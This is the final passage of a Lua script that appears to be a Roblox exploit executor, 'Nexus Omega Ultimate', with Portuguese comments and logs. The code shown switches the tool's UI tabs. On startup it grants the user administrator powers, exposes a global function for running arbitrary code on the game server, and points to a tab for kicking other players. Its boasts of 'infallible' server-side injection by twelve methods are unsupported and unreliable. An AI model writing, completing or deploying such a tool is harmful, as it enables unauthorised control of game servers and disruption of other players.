        Nexus:AddLog("Console limpo", Color3.fromRGB(255,255,100))
    end)
    
    -- Troca de abas
    local function switchTab(tab)
        ssFrame.Visible = (tab == "ss")
        csFrame.Visible = (tab == "cs")
        adminFrame.Visible = (tab == "admin")
        consoleFrame.Visible = (tab == "console")
        ssBtn.TextColor3 = (tab == "ss") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        csBtn.TextColor3 = (tab == "cs") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        adminBtn.TextColor3 = (tab == "admin") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        consoleBtn.TextColor3 = (tab == "console") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
    end
    ssBtn.MouseButton1Click:Connect(function() switchTab("ss") end)
    csBtn.MouseButton1Click:Connect(function() switchTab("cs") end)
    adminBtn.MouseButton1Click:Connect(function() switchTab("admin") end)
    consoleBtn.MouseButton1Click:Connect(function() switchTab("console") end)
    
    return screenGui
end

-- ============================================================================
-- INICIALIZAÇÃO DO EXECUTOR
-- ============================================================================
local function Initialize()
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", Color3.fromRGB(100,100,255))
    Nexus:AddLog("  🔥 NEXUS OMEGA ULTIMATE - Executor Server-Side Infalível 🔥", Color3.fromRGB(255,100,0))
    Nexus:AddLog("  Limite de texto: 10^15 caracteres | 12 métodos de injeção", Color3.fromRGB(100,200,255))
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", Color3.fromRGB(100,100,255))
    
    -- Criar interface
    local gui = CreateUltimateUI()
    if not gui then
        Nexus:AddLog("❌ Falha ao criar interface. Tentando fallback...", Color3.fromRGB(255,50,50))
        return
    end
    Nexus:AddLog("✅ Interface carregada (850x650, arrastável)", Color3.fromRGB(0,255,0))
    
    -- Executar teste visual automático
    Nexus:AddLog("🎯 Iniciando teste visual em 3 segundos...", Color3.fromRGB(255,200,0))
    task.wait(3)
    Nexus:TesteVisual()
    
    -- Tornar admin automaticamente
    Nexus:AddLog("👑 Concedendo poderes administrativos...", Color3.fromRGB(255,215,0))
    Nexus:MakeAdmin()
    
    -- Expor funções globais
    getgenv().executarServer = function(code) return Nexus:ExecuteServer(code) end
    getgenv().NexusUltimate = Nexus
    
    Nexus:AddLog("✅ Função global 'executarServer' disponível", Color3.fromRGB(0,255,0))
    Nexus:AddLog("✅ Use a aba ADMIN/KICK para expulsar jogadores", Color3.fromRGB(100,200,255))
    Nexus:AddLog("🎉 PRONTO! AGORA VOCÊ É O ADMINISTRADOR ABSOLUTO.", Color3.fromRGB(0,255,0))
end

-- Executar com proteção total
pcall(Initialize)
